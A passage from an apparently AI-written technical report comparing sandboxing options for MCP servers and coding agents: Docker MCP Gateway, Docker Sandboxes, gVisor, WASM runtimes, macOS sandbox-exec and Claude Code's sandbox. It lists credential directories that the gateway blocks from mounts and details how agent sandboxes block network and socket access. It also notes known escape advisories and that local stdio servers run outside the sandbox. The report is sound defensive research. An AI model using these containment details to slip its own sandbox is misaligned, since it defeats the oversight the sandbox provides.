**There is no `--runtime` flag.** Combined with the threat model's statement — "Containers are started with **Docker isolation**, `no-new-privileges`, and configured CPU and memory limits" — the conclusion is that **the gateway uses the Docker daemon's default runtime (runc), not gVisor/`runsc`, not Kata, not a microVM.** I found **no** mention of gVisor, `runsc`, Kata, or microVMs anywhere in the mcp-gateway README, `docs/security.md`, `docs/mcp-gateway.md`, `docs/server-entry-spec.md`, `docs/profiles.md`, `docs/catalog.md`, or the generated CLI reference. *(This is a strong inference from an exhaustive flag list plus an explicit doc statement; it is not a sentence reading "we use runc". Flagged as high-confidence inference, not verbatim.)*

Documented resource isolation (from [MCP Toolkit docs, fetched 2026-09-19](https://raw.githubusercontent.com/docker/docs/main/content/manuals/ai/mcp-catalog-and-toolkit/toolkit.md)):
- "CPU allocation: MCP tools are run in their own container. They are restricted to **1 CPU**"
- "Memory allocation: Containers for MCP tools are limited to **2 GB**"
- "Filesystem access: By default, MCP Servers have **no access to the host filesystem**. The user explicitly selects the servers that will be granted file mounts."
- "Interception of tool requests: Requests to and from tools that contain sensitive information such as secrets are blocked."

Filesystem/bind-mount hardening (v0.43.1 + `security.md`):
- "Host path binds default to **read-only**, must resolve under trusted roots such as temporary directories or `MCP_GATEWAY_DOCKER_BIND_ALLOWED_PATHS`, and **cannot target known sensitive system or credential paths**."
- "Writable host path binds require an exact path allowlist entry in `MCP_GATEWAY_DOCKER_BIND_ALLOW_WRITABLE_PATHS`."
- v0.43.1 blocks by default: "Writable host binds, relative host paths, sensitive system paths, Docker socket binds, and credential directories such as `.ssh`, `.docker`, `.kube`, `.aws`, and `.gnupg`."

Image integrity:
- `--verify-signatures` default `true`; "Signature verification is enabled by default for Docker MCP images in the Docker Hub `mcp/` namespace. Those images must be referenced **by digest** when verification is enabled, and they are verified **before pull or run**." Mutable tags such as `mcp/time:latest` are rejected by default. Third-party non-`mcp/` images are pulled **without** Docker MCP signature verification — "Their trust comes from the user's catalog, profile, or operator configuration choice."
- Catalog provenance: "Currently, a majority of the servers in the catalog are built directly by Docker. Each server includes attestations such as: Build attestation (Docker Build Cloud); Source provenance; Signed SBOMs." And, candidly: "Docker's security measures currently represent a **best-effort approach**. While Docker implements automated testing, scanning, and metadata extraction for each server in the catalog, these security measures are **not yet exhaustive**." ([FAQs](https://raw.githubusercontent.com/docker/docs/main/content/manuals/ai/mcp-catalog-and-toolkit/faqs.md))

Additional isolation boundary described in the toolkit docs: "Depending on the MCP server, the tools it provides might run within the same container as the server or in dedicated containers for better isolation." ([toolkit.md](https://raw.githubusercontent.com/docker/docs/main/content/manuals/ai/mcp-catalog-and-toolkit/toolkit.md)). This is an under-specified claim — no mechanism or default is documented. **UNVERIFIED as to defaults.**

### 2.7 Client composition

- **stdio (default):** Claude Desktop config:
  ```json
  { "mcpServers": { "MCP_DOCKER": { "command": "docker", "args": ["mcp", "gateway", "run"] } } }
  ```
  ([docs/mcp-gateway.md](https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/mcp-gateway.md))
- **VS Code / generic JSON clients:**
  ```json
  "mcp": { "servers": { "MCP_DOCKER": { "command": "docker",
    "args": ["mcp", "gateway", "run", "--profile", "my_profile"], "type": "stdio" } } }
  ```
  ([toolkit.md](https://raw.githubusercontent.com/docker/docs/main/content/manuals/ai/mcp-catalog-and-toolkit/toolkit.md))
- **One-command client wiring:** `docker mcp client connect <client> --profile <profile-id>` — e.g. `docker mcp client connect vscode --profile my-project` writes `.vscode/mcp.json`; `docker mcp client connect claude-code --global`.
- **Remote transports:** `docker mcp gateway run --port 8080 --transport streaming` (or `sse`). Auth model: "When the gateway is run with the `sse` or `streaming` HTTP transports, requests require a **Bearer token** by default. The token is read from `MCP_GATEWAY_AUTH_TOKEN` when set or generated by the gateway. `--allow-unauthenticated` is an explicit opt-out." Browser `Origin` header requests are accepted only from localhost origins (`localhost`, `127.0.0.1`, `::1`); requests without `Origin` remain allowed; `/health` is intentionally unauthenticated. ([docs/security.md](https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/security.md))
- **Docker Desktop auto-run:** "If you use Docker Desktop with MCP Toolkit enabled, the Gateway runs automatically in the background." ([MCP Gateway docs page](https://raw.githubusercontent.com/docker/docs/main/content/manuals/ai/mcp-catalog-and-toolkit/mcp-gateway.md))
- **Interceptors:** `--interceptor 'when:type:path'` (e.g. `before:exec:/bin/path`) — user-pluggable pre/post hooks. The gateway treats configured interceptors as **trusted** and reports that depend on custom interceptors are out of scope.
- **Custom catalogs** (an enterprise allowlist tool): `docker mcp catalog create`, `catalog push/pull/tag`, `docker mcp gateway run --catalog <oci-ref>`. Note: "If multiple catalogs define the same server name, the last-loaded catalog wins."

### 2.8 Breaking changes and required actions

**v0.43.1 (2026-06-25) is the big one** — the release notes literally have an "Action required" section. Full list of changes ([release notes](https://github.com/docker/mcp-gateway/releases/tag/v0.43.1)):

1. **Remote URL handling stricter by default** — public HTTPS only; rejects loopback, private networks, link-local, metadata services, cluster-local names, userinfo, unsafe redirects.
2. **HTTP gateway transports require authentication by default** — `Authorization: Bearer <token>`; `--allow-unauthenticated` to opt out; warns on an externally reachable listener.
3. **Local catalog and `file://` inputs must live under `~/.docker/mcp/catalogs`** — symlinks resolved before the trusted-root check.
4. **Docker bind mounts validated before containers start** — read-only + trusted roots; writable/relative/sensitive paths, docker socket, and credential dirs blocked; `MCP_GATEWAY_DOCKER_BIND_ALLOWED_PATHS` for extra roots.
5. **Docker MCP images verified before pull** — digest pinning required while verification is on.
6. **Tool names can no longer shadow each other** — collision rejection vs. other servers and reserved gateway tools (`mcp-exec`); `mcp-add` returns an explicit collision error.
7. **Prompts and resources can no longer shadow each other** — duplicate prompt names, resource URIs, resource-template URI templates rejected; `mcp-discover` prompt name reserved.
8. **Tool call logs no longer include raw argument values.**

**v0.42.0 (2026-04-30):** removed the `MCPWorkingSets` feature flag — profiles are now always enabled ([release notes](https://github.com/docker/mcp-gateway/releases/tag/v0.42.0)). If you were relying on the feature flag for behaviour gating, that gate is gone.

**v0.42.1 (2026-05-05):** removed the `McpGatewayOAuth` feature flag.

**v0.42.0** also added npm/npx server support to the MCP catalog — which broadens the "npx servers granted minimal host privileges" path described in the README.

**Catalog schema generation:** servers now consume catalog v2 (`https://desktop.docker.com/mcp/catalog/v2/catalog.yaml`) or v3 (`.../v3/catalog.yaml` when the `mcp-oauth-dcr` feature is enabled) ([docs/mcp-gateway.md](https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/mcp-gateway.md)). Old `docker-mcp.yaml`-style legacy catalogs still work only with the profiles feature flag **off** ([docs/catalog.md](https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/catalog.md) — "This method of catalog management is deprecated").

**Profiles vs. flat registries:** `docker mcp config read/write`, `docker mcp server enable/disable`, and the `~/.docker/mcp/{docker-mcp,registry,config,tools}.yaml` files documented in the Go-module v0.33.0 README ([pkg.go.dev v0.33.0](https://pkg.go.dev/github.com/docker/mcp-gateway@v0.33.0)) are superseded by the profile model in the current `main` README. **CONFLICT between documentation generations** — the v0.33.0 snapshot and the current `main` README describe different configuration surfaces.

### 2.9 Known vulnerabilities

| ID | Description | Affected | Fixed | Date |
|---|---|---|---|---|
| **CVE-2026-55887** / GHSA-r2xf-7jw5-pjg6 / GO-2026-5604 | "Argument injection via OCI image label YAML in Docker MCP Gateway" | `>= v0.21.0, < v0.42.2` | **v0.42.2** | Published 2026-06-25; fix tag 2026-05-28 ([GO-2026-5604](https://pkg.go.dev/vuln/GO-2026-5604); [v0.42.2 notes](https://github.com/docker/mcp-gateway/releases/tag/v0.42.2): "Narrow OCI label schema to descriptive fields only") |
| **GO-2025-4179** | "Docker MCP Plugin and Docker MCP Gateway have DNS Rebinding vulnerability when running in sse or streaming mode" | `>= v0.9.0` (per affected-version annotations) | not stated in the vuln DB entry | listed from v0.9.0 (2025-06-29) onward ([pkg.go.dev versions](https://pkg.go.dev/github.com/docker/mcp-gateway?tab=versions)) |

Corresponding hard boundary in current docs: "OCI image labels are treated as import metadata only. Labels may provide descriptive server and tool metadata, but they must not inject runtime-shaping fields such as commands, volume mounts, secrets, environment values, users, or nested container configuration." ([docs/security.md](https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/security.md)) — this is the post-CVE-2026-55887 design statement.

### 2.10 Docker Sandboxes — the microVM product, and its MCP caveat

Announced **week of 2026-04-06/09**, blog published **2026-04-16** ([Docker blog, 2026-04-16](https://www.docker.com/blog/why-microvms-the-architecture-behind-docker-sandboxes/)).

- **Isolation:** "Each sandbox gets its own kernel… hardware-boundary isolation." Docker **built its own VMM**: "It runs natively on all three platforms using each OS's native hypervisor: **Apple's Hypervisor.framework, Windows Hypervisor Platform, and Linux KVM**." Docker explicitly rejected Firecracker: "It has no native support for macOS or Windows, full stop." And explicitly rejected WASM/V8 isolates: "Even providers of isolate-based sandboxes have acknowledged that hardening V8 is difficult… your agent can't install system packages or run arbitrary shell commands."
- **Not gVisor.** No mention of gVisor/runsc anywhere in the Docker Sandboxes architecture or security docs.
- **Credential handling:** "the host-side proxy injects authentication headers into outbound HTTP requests. The raw credential values never enter the VM." Layers listed: hypervisor isolation, network isolation (deny-by-default, proxied), Docker Engine isolation (own daemon, no path to host daemon), workspace isolation, credential isolation.
- **Version datapoint:** `sbx` version **0.42.0** changed `sbx create` to make workspace paths optional ([Architecture, fetched 2026-09-19](https://raw.githubusercontent.com/docker/docs/main/content/manuals/ai/sandboxes/architecture.md)).
- **⚠️ Critical MCP caveat, verbatim:** "Registered MCP servers can be remote endpoints, or they can be local stdio servers launched on the host. **Local stdio servers don't run inside the sandbox VM.** If a local stdio server is packaged as an OCI image, or if you register an explicit `docker` command, it uses Docker on the host." And: "**Treat local MCP servers as trusted host integrations.**" ([Sandboxes security model](https://raw.githubusercontent.com/docker/docs/main/content/manuals/ai/sandboxes/security/_index.md))
  **So: Docker Sandboxes does *not* sandbox your stdio MCP servers. It sandboxes the agent, and brokers the MCP servers from the host.**

---

## 3. gVisor

### 3.1 Current version and cadence

Latest release: **gVisor 20260914.0**, tagged **2026-09-16** ([releases.atom](https://github.com/google/gvisor/releases.atom)). Recent history from the same feed:

| Release | Tagged |
|---|---|
| 20260914.0 | 2026-09-16 |
| 20260907.0 | 2026-09-11 |
| 20260831.0 | 2026-09-04 |
| 20260817.0 | 2026-08-25 |

Cadence: roughly weekly patch/rolling releases, with date-stamped version numbers (`release-YYYYMMDD.N`).

Selected items from the 20260831.0 changelog relevant to sandboxing ([release notes](https://github.com/google/gvisor/releases/tag/release-20260831.0)):
- "Add `zstd` variant of gVisor release tarball."
- "Change default sidecar usage policy to disallow embedded fallback." / "Enforce sidecar version matching."
- "`runsc`: Add flag to control policy of sidecar binaries."
- "Make the **bwrap alias** a wrapper around the `sandboxexec` Go bindings."
- "Add building the **Python SandboxExec** wheel to our build pipeline."
- "Add support for custom mounts in Python SandboxExec" / "custom working directory in Python SandboxExec" (20260817.0).
- "Replace the experimental `--mount-cgroup-v2` flag with `in-sandbox-cgroup`."
- "Show `NoNewPrivs` in `/proc/[pid]/status`."
- "Implement `openat2(2)` in gVisor."
- "Add **GKE Sandbox MicroVM runtime** support to `gke_tester` and `testcluster`" — note gVisor itself is tracking a *MicroVM* runtime alongside its own.

### 3.2 What gVisor technically provides

Source: [gVisor "What is gVisor?", fetched 2026-09-19](https://gvisor.dev/docs/)

- "gVisor provides a strong layer of isolation between running applications and the host operating system. It is an application kernel that implements a Linux-like interface. Unlike Linux, it is written in a **memory-safe language (Go)** and runs in **userspace**."
- Components: **Sentry** (per-sandbox userspace kernel: "system calls, signal delivery, memory management and page faulting logic, the threading model"; "the Sentry does not pass system calls through to the host kernel"), **Gofer** (per-container host process mediating filesystem over **9P** "over a socket or shared memory channel"; "The Sentry process is started in a restricted seccomp container without access to file system resources"), and **`runsc`** (OCI runtime, integrates with Docker/Kubernetes/containerd/CRI-O).
- Explicit positioning: "gVisor is **not a syscall filter** (e.g. `seccomp-bpf`), nor a wrapper over Linux isolation primitives (e.g. `firejail`, AppArmor, etc.). gVisor is also **not a VM**."
- Honest limitation statement: "gVisor does not presently implement every system call, `/proc` file, or `/sys` file so some incompatibilities may occur." Trade-off: "this comes at the price of **reduced application compatibility and higher per-system call overhead**." And: "gVisor may provide poor performance for system call heavy workloads."

**Platforms** ([Platform Guide, fetched 2026-09-19](https://gvisor.dev/docs/architecture_guide/platforms/)):
- **KVM** — "uses the kernel's KVM functionality to allow the Sentry to act as both guest OS and VMM. The KVM platform runs best on bare-metal setups."
- **systrap** — "relies on `seccomp`'s **`SECCOMP_RET_TRAP`** feature in order to intercept system calls. This makes the kernel send **`SIGSYS`** to the triggering thread." **"`systrap` replaced `ptrace` as the default gVisor platform in mid-2023."** Recommended when running inside a VM or without virtualization support.
- **ptrace** — uses `PTRACE_SYSEMU`. "**no longer supported and is expected to eventually be removed entirely.**"

**MCP-specific gVisor guidance: none found.** I searched for gVisor+MCP integrations and found no official gVisor blog post, doc page, or reference architecture for MCP servers. **UNVERIFIED / not found as of 2026-09-19.** The nearest thing is the generic `runsc` Docker integration (`docker run --runtime=runsc`), documented at [Docker Quick Start](https://gvisor.dev/docs/user_guide/quick_start/docker/) — but that path is **not** wired into Docker MCP Gateway (no `--runtime` flag; §2.6).

**Docker Desktop / Docker Sandboxes default runtime:** Docker Sandboxes uses its own purpose-built VMM on Apple Hypervisor.framework / WHPX / KVM, **not** gVisor ([Docker blog, 2026-04-16](https://www.docker.com/blog/why-microvms-the-architecture-behind-docker-sandboxes/)). Docker Desktop's default container runtime on Linux-based backends is not gVisor; I found no Docker documentation claiming otherwise. **UNVERIFIED whether Docker Desktop offers a gVisor runtime option as of 2026-09** — I found no primary source either way.

**Practical caveat for MCP-style stdio servers under gVisor (analysis, not a quote):** gVisor's own docs flag `/proc` and `/sys` incompleteness and per-syscall overhead. Node.js and Python MCP servers frequently read `/proc/self/*`, use `io_uring` (blocked in Docker's default seccomp profile anyway — see §6.3), and spawn heavy syscall traffic. Expect compatibility testing to be required. **This is my analysis, not a published gVisor statement — flagged as such.**

---

## 4. WASM / WASI for MCP servers

### 4.1 Versions and dates

| Runtime | Latest version | Date | Notes | Source |
|---|---|---|---|---|
| **Wasmtime** | **48.0.2** | **2026-09-10** | 48.0.0 released 2026-08-20; 49.0.0-rc.1 2026-09-05; 47.0.4 / 46.0.3 / 36.0.14 / 24.0.13 all 2026-08-20 (security backports) | [releases.atom](https://github.com/bytecodealliance/wasmtime/releases.atom) |
| **Extism** | **1.30.0** | **2026-06-04** | dev build (`latest`) upgraded to **Wasmtime 48 (LTS)** on 2026-09-02 (#912); 1.21.0 (2026-03-26) was Wasmtime 41 | [releases.atom](https://github.com/extism/extism/releases.atom) |
| **wasmCloud** | **2.9.0** | **2026-09-08** | 2.6.1 2026-07-29; 2.6.0 2026-07-28 | [releases.atom](https://github.com/wasmCloud/wasmCloud/releases.atom) |
| **Spin** (Spinframework) | **4.1.0** | **2026-08-26** | "Update to Wasmtime **44.0.0**"; "`spin`: update from `wasm32-wasip1` to **`wasm32-wasip2`**"; WASI P3 work; Spin Rust SDK v7.0.0 | [releases.atom](https://github.com/spinframework/spin/releases.atom) |
| **WASI** | **0.3.1** | **2026-08-11** | 0.3.0 released **2026-06-11** | [wasi.dev/releases/wasi-p3, fetched 2026-09-19](https://wasi.dev/releases/wasi-p3) |

**Wasmtime security advisories (fixed 2026-08-20, backported to 47.0.4 / 46.0.3 / 36.0.14 / 24.0.13):**
- **GHSA-vqjp-4c8c-hfgg** — "Filesystem sandbox escape when paths or symlinks contain trailing slashes."
- **GHSA-x84v-gj2h-g759** — "Guest controlled-size host heap allocation through WASIp3 streams."

Both are directly relevant: one is a *sandbox escape in the exact mechanism you'd use to sandbox an MCP server*, the other is a memory-exhaustion vector from untrusted guest code. ([v47.0.4 notes](https://github.com/bytecodealliance/wasmtime/releases/tag/v47.0.4))

### 4.2 WASI 0.2 → 0.3: what changed that matters for isolation

Source: [WASI 0.3 page, fetched 2026-09-19](https://wasi.dev/releases/wasi-p3)

- **WASI 0.3.0 released 2026-06-11**; **0.3.1 released 2026-08-11** ("Adopts the Component Model `map<K, V>` type and the `implements` and `external-id` annotations"). Patch releases "ship every two months on the release train."
- Core change: native async moved into the Component Model canonical ABI. `wasi:io` is **removed entirely** — `pollable` → `future<T>`, `input-stream`/`output-stream` → `stream<u8>`.
- **`wasi:sockets`: interfaces consolidated from 7 to 2.** "The `network`, `instance-network`, `tcp`, `tcp-create-socket`, `udp`, and `udp-create-socket` interfaces are consolidated into a unified `types` interface… A separate `ip-name-lookup` interface handles DNS resolution." **"The `network` resource is removed. Network access is now granted at the world level."** — this is the capability-model shift that matters most for sandboxing: networking became a *world-level import* rather than a resource you can hand around.
- New error variant `connection-broken` (POSIX `EPIPE`) in `wasi:sockets`; new `size-exceeded` in `wasi:http` `header-error`.
- **Runtime support:** "**Wasmtime 46 and later, which enables WASI 0.3 and the `component-model-async` feature by default**." "Wasmtime 43 through 45 implement the `0.3.0-rc-2026-03-15` snapshot, and Wasmtime 41 and 42 the earlier `0.3.0-rc-2026-01-06` snapshot; all of these require **`-Sp3 -W component-model-async=y`**."
- **Backwards compatibility:** "`wasmtime serve` accepts either a WASI 0.3 or a WASI 0.2 component, falling back to the WASI 0.2 `wasi:http/proxy` world for components that do not export the 0.3 `service` world."
- Conformance: "Runtimes verify WASI 0.3 conformance against the shared `wasi-testsuite`… running on Wasmtime and jco across Linux, macOS, and Windows."
- Migration warning worth repeating: "Wasmtime and the bindings generator (`wit-bindgen` for Rust, `jco` for JavaScript, and so on) should target the same WIT version, `0.3.0`. Mismatches surface as confusing `wrong type` errors at instantiation."

### 4.3 Concrete capability-sandboxing properties

**Wasmtime default change (48.0.0, 2026-08-20)** — quoted verbatim from the release notes:

> "The `wasmtime-wasi` crate's default configuration now **denies creation of TCP/UDP sockets by default**." ([PR #13936](https://github.com/bytecodealliance/wasmtime/pull/13936))

Also in 48.0.0: "Permissions for `wasi-filesystem` in the implementation of the `wasmtime-wasi` crate have been simplified to either read-write or read-only for a directory" ([PR #14010](https://github.com/bytecodealliance/wasmtime/pull/14010)); "Wasmtime now requires Rust 1.95.0 to build"; "Wasmtime now supports configurable **fuel costs** for variable-length wasm opcodes" ([#13931](https://github.com/bytecodealliance/wasmtime/issues/13931)).

**CLI surface, verified** ([Wasmtime CLI Options, fetched 2026-09-19](https://docs.wasmtime.dev/cli-options.html)):
- `-S, --wasi <KEY[=VAL[,..]]>` — "Options for configuring WASI and its proposals". `-S help` enumerates keys.
- `-W, --wasm <KEY[=VAL[,..]]>` — "Options for configuring semantic execution of WebAssembly."
- `-C, --codegen`, `-O, --optimize`, `-D, --debug`, `--config <FILE>` (TOML), or `WASMTIME_*` environment variables.
- **Filesystem preopens are explicit and opt-in:** the docs' own example is emphatic — `wasmtime foo.wasm --dir .` passes `--dir .` **to the guest**, not to Wasmtime. "If you want to mount the current directory you instead need to invoke `wasmtime --dir . foo.wasm`." This is the concrete realisation of "no ambient authority": nothing is reachable unless a preopen is created, and getting the argument order wrong silently grants the guest an argument instead of a capability.
- ⚠️ **Security warning on `wasmtime serve`, verbatim:** "**Not recommended for production use.** The `wasmtime serve` command is intended solely for local development and testing. It **does not** implement safeguards against: Unbounded outbound HTTP requests; Rate limiting or connection throttling; DDoS protections; Request size limits; TLS/HTTPS termination. **Do not deploy `wasmtime serve` in a production environment** without an additional reverse proxy or gateway layer."

**UNVERIFIED in this pass:** the individual `-S` sub-key names (e.g. the exact spellings for inheriting the network namespace, allowing TCP listen, or allowing IP name lookup). The official CLI-options page documents `-S`/`--wasi` as a group but does not enumerate its keys in the page text; `wasmtime run -S help` is authoritative. Do not rely on memory for these spellings.

**Engine-level resource limits:** fuel metering and epoch interruption are Wasmtime engine APIs; the CLI-options page documents `-W`/`-O` groups generically. Extism exposes fuel explicitly — v1.13.0 (2025-11-25) added "expose building a `CompiledPlugin` with a fuel limit", and v1.10.0 (2025-02-10) added "a function to track fuel consumption" ([Extism releases](https://github.com/extism/extism/releases.atom)). wasmCloud v2.9.0 (2026-09-08) added "Enforce `max-guest-memory`" and earlier "one connection quota and one socket policy per guest" ([#5439](https://github.com/wasmCloud/wasmCloud/pull/5439)).

### 4.4 Published MCP-over-WASM work

| Work | Venue | Date | What it is |
|---|---|---|---|
| **MCP-SandboxScan / SandScope** | arXiv:2601.01241 (cs.CR) | v1 2026-01-03; **v2 2026-06-22** | "WASM-based Secure Execution and Runtime Analysis for MCP Tools." Executes portable tools **under WASI** *or* drives unmodified MCP servers over stdio; extracts "LLM-visible sinks" from tool results and prompt/message fields; reports "auditable source-to-sink witnesses from environment, file, and tool-input sources"; separately records "network-intent and egress evidence"; semantic layer recovers declared capabilities from `tools/list` metadata. Results: "completes shallow dynamic scans for **35 repositories** and, through a broader semantic profiling pass, recovers metadata for **1,127 tools across 71 repositories, including 886 tools with security-sensitive declared capabilities**. A schema-guided exploration pass over the 35 dynamically scanned repositories re-executes 33 and observes source-to-sink witnesses in **12**." ([arXiv abs](https://arxiv.org/abs/2601.01241)) |
| **wasmCloud: "MCP Server as a Wasm Component: OpenAPI to MCP, JCO & Component Model"** | wasmCloud community meeting | 2025-10-08 | Community talk; runs an MCP server generated from OpenAPI as a Wasm component, via `jco`. ([meeting page](https://wasmcloud.website.cncfstack.io/community/2025-10-08-community-meeting/)) — **secondary-source date; I did not fetch a canonical wasmCloud blog post for this. Treat the date as approximate.** |
| **openapi2mcp Wasm plugin demo / WASI P3 & JCO async** | wasmCloud community meeting | 2025-10-29 | Component-model MCP tooling demo ([meeting page](https://wasmcloud.com/community/2025-10-29-community-meeting/)) — same caveat. |
| **`peter-jerry-ye/mcp-server`** | GitHub | undated in this pass | An MCP server implementation in MoonBit targeting Wasm. **UNVERIFIED** (I did not fetch the repo; found only via search index). |
| **`fastertools/wasmcp`** | pkg.go.dev | undated in this pass | Go SDK package named `wasmcp` under `src/sdk/go`. **UNVERIFIED.** |

### 4.5 Is WASM in the official MCP registry or docs?

**No.** Verified negatives:
- Registry package types are exactly `npm`, `pypi`, `nuget`, `cargo`, `oci`, `mcpb` — no `wasm`, no `wasi`, no `component` ([package-types.md, fetched 2026-09-19](https://modelcontextprotocol.io/registry/package-types.md)).
- No WASM-related SEP exists in the full SEP index ([llms.txt](https://modelcontextprotocol.io/llms.txt)). The closest adjacent SEPs are SEP-1730 (SDK Tiering), SEP-2133 (Extensions), SEP-1865 (MCP Apps).
- The 2026-07-28 Security Best Practices page mentions "containers, chroot, application sandboxes, etc." as platform-appropriate sandboxing technologies — **WebAssembly is not listed**.

**Structural implication (analysis):** because the registry's `oci` and `mcpb` types are the only "prebuilt artifact" paths and both are OS-process artifacts, a WASM-packaged MCP server today must be distributed out-of-band (raw `.wasm`/component fetched from a release URL) and launched by a host that knows how to run components. There is no registry-level provenance or hash verification path for a WASM MCP server the way there is for MCPB (`fileSha256` is mandatory in `server.json` for MCPB and validated client-side).

### 4.6 Honest assessment of WASM for MCP server sandboxing

**Strengths:** no ambient authority by construction; deny-by-default wherever an import is required; a WASI component cannot make a syscall, only call an imported interface the host chose to provide; per-instance memory isolation; deterministic resource metering (fuel/epoch); cold start in microseconds-to-milliseconds; the `wasi:sockets` world-level network grant in 0.3 is a cleaner capability boundary than POSIX sockets.

**Weaknesses, evidenced:** (a) the trailing-slash **filesystem sandbox escape** GHSA-vqjp-4c8c-hfgg shows the preopen implementation is itself attack surface; (b) an MCP server that shells out, uses native npm/PyPI dependencies, or reads arbitrary host paths cannot be componentised without rewriting — Docker's own engineering blog makes this argument explicitly: "your agent can't install system packages or run arbitrary shell commands. For a coding agent that needs a real development environment, WASM isn't one" ([Docker blog, 2026-04-16](https://www.docker.com/blog/why-microvms-the-architecture-behind-docker-sandboxes/)); (c) there is **no official distribution, provenance, or client-support path** for WASM MCP servers in the MCP ecosystem as of 2026-09-19.

---

## 5. macOS sandboxing and Anthropic's Claude Code sandbox

### 5.1 `sandbox-exec` / Seatbelt: deprecated in the man page since 2017, still shipping and still used in 2026

**Primary source** — the man page text, verbatim ([SANDBOX-EXEC(1), Xcode man pages mirror](https://keith.github.io/xcode-man-pages/sandbox-exec.1.html)):

```
NAME
     sandbox-exec — execute within a sandbox (DEPRECATED)

DESCRIPTION
     The sandbox-exec command is DEPRECATED.  Developers who wish to sandbox
     an app should instead adopt the App Sandbox feature described in the App
     Sandbox Design Guide.  The sandbox-exec command enters a sandbox using a
     profile specified by the -f, -n, or -p option and executes command with
     arguments.

     -f profile-file    Read the profile from the file named profile-file.
     -n profile-name    Use the pre-defined profile profile-name.
     -p profile-string  Specify the profile to be used on the command line.
     -D key=value       Set the profile parameter key to value.

SEE ALSO
     sandbox_init(3), sandbox(7), sandboxd(8)

March 9, 2017                    Mac OS X                    SANDBOX-EXEC(1)
```

Key points:
- **Deprecation is a documentation status, dated 2017-03-09.** It is not a removal. The binary is still present and still invoked by shipping products in September 2026.
- The `-p profile-string` form (inline SBPL) is exactly what Anthropic's `srt` uses.
- `-D key=value` parameterisation is available.

**Is it removed or broken in macOS 15 (Sequoia) / macOS 26 (Tahoe)?** **UNVERIFIED.** I found no Apple statement, release note, or credible primary source stating that `sandbox-exec` was removed or disabled in macOS 15 or macOS 26. What I *can* verify is that a shipping, actively-maintained product (Anthropic sandbox-runtime, releases as recent as **2026-09-18**) still depends on it on macOS and its documentation presents it as working. Any claim that "sandbox-exec was removed in Tahoe" should be treated as unsubstantiated until a primary source is produced.

**Alternatives (status of each honestly assessed):**
- **App Sandbox** — the deprecation notice's recommended replacement. Entitlement-based, requires a code-signed app bundle with `com.apple.security.app-sandbox`; not applicable to wrapping an arbitrary third-party MCP server binary you downloaded. **I did not fetch Apple's App Sandbox entitlement reference in this pass; the entitlement key name is stated here from the man page's framing only — treat specific entitlement strings as UNVERIFIED.**
- **`sandbox_init(3)`** — referenced in the man page's SEE ALSO. Whether it is present in the public SDK or carries a `__API_DEPRECATED` attribute in current SDK headers: **UNVERIFIED in this pass.** Widely believed to be private/spi; I have no primary source to cite.
- **Endpoint Security framework** — **UNVERIFIED in this pass.** Entitlement name (`com.apple.developer.endpoint-security.client`), SIP restrictions, and applicability to child-process confinement were not verified against Apple documentation.
- **Profile files** — the man page's `-n profile-name` resolves pre-defined profiles. Paths commonly cited (`/System/Library/Sandbox/Profiles`, `/usr/share/sandbox`): **UNVERIFIED in this pass.**

Given the user's emphasis on primary sources, I am deliberately not asserting these four items. They are the main **evidence gaps** in this report.

### 5.2 Anthropic Claude Code sandboxing — concrete mechanism, keys, versions

**Documentation:** [code.claude.com/docs/en/sandboxing](https://code.claude.com/docs/en/sandboxing) ("Configure the sandboxed Bash tool"), fetched 2026-09-19. Related: [Sandbox environments](https://code.claude.com/docs/en/sandbox-environments), [Settings reference](https://code.claude.com/docs/en/settings-reference#sandbox-settings).
**Announcement blog:** [anthropic.com/engineering/claude-code-sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing) — **the page as fetched does not display a publication date**; the accompanying "Claude Code on the web" launch is dated 2025-10-20/21 by third parties. **Publication date UNVERIFIED; content verified.**
**Open-source engine:** [`anthropics/sandbox-runtime`](https://github.com/anthropics/sandbox-runtime) (npm `@anthropic-ai/sandbox-runtime`, CLI `srt`). The repo previously lived at `anthropic-experimental/sandbox-runtime`; that path now redirects ([README, fetched 2026-09-19](https://raw.githubusercontent.com/anthropics/sandbox-runtime/main/README.md)).

**Mechanism, by platform — verbatim from the docs:**

> "**macOS**: uses Seatbelt for sandbox enforcement
> **Linux**: uses [bubblewrap](https://github.com/containers/bubblewrap) for isolation
> **WSL2**: uses bubblewrap, same as Linux"

> "On macOS, there is nothing to install: sandboxing uses the built-in Seatbelt framework."

> "On Linux and WSL2, the sandbox relies on two packages: **bubblewrap** — the unprivileged sandboxing tool that enforces filesystem isolation; **socat** — the relay used to route network traffic through the sandbox proxy."

Additional dependency: the **seccomp filter** is optional and "adds Unix domain socket blocking. Install it with `npm install -g @anthropic-ai/sandbox-runtime` if it is missing." `ripgrep` is bundled with the native binary. `/sandbox` → **Dependencies** tab lists which of `ripgrep`, `bubblewrap`, `socat`, and the seccomp filter your platform lacks.

From the sandbox-runtime README, the exact mechanism per platform:
- **macOS:** "Uses `sandbox-exec` with dynamically generated **Seatbelt profiles**." Network: "The Seatbelt profile allows communication only to a specific localhost port. The proxies listen on this port, creating a controlled channel for all network access."
- **Linux:** "Uses `bubblewrap` for containerization with **network namespace isolation**." Specifically: "The network namespace of the sandboxed process is removed entirely, so all network traffic must go through the proxies running on the host (listening on Unix sockets that are bind-mounted into the sandbox)." Plus a **two-stage seccomp** design: outer bwrap → socat bridges inside → `apply-seccomp` creates a nested user+PID+mount namespace, remounts `/proc`, becomes PID 1 non-dumpable, then "forks, applies the seccomp filter via `prctl()`, and execs the user command." The BPF filter "intercepts the `socket()` syscall and blocks creation of `AF_UNIX` sockets by returning **`EPERM`**" and also blocks **`io_uring_setup`/`io_uring_enter`/`io_uring_register`** "(the latter three because `IORING_OP_SOCKET` on Linux 5.19+ would otherwise bypass the `socket()` rule)". Architecture support: "**x64 and arm64** are fully supported with pre-built binaries. Other architectures are not currently supported."
- **Windows:** "WFP `ALE_AUTH_CONNECT` filter blocks every outbound connect from the `srt-sandbox` account except loopback to the configured proxy port range"; filesystem via "additive `(OI)(CI)` explicit ACEs for the `srt-sandbox` SID." **Note from the docs: "Native Windows is not supported"** for Claude Code itself — Windows users run inside WSL2.

**Configuration keys — real names, verified:**

Sandbox enablement and scope:
- `sandbox.enabled` (bool) — in `~/.claude/settings.json` to enable across all projects.
- `.claude/settings.local.json` — where the `/sandbox` panel writes mode selection.
- `--settings <file>` CLI flag to change a setting for one session.
